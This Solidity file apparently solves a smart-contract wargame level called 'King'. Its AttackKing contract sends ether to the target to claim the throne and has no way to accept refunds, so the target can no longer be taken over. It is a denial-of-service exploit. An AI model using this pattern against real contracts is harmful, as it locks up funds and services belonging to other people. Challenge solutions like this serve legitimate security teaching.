// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {
    constructor (address payable _kingAddress) public {
        kingAddress = _kingAddress;
    }

    address payable public kingAddress;

    function breakTheGame() external payable {
        (bool sent,) = kingAddress.call{value: msg.value}("");
        require(sent, "Send failed");
        // kingAddress.transfer(1000000000000000 wei);
    }
}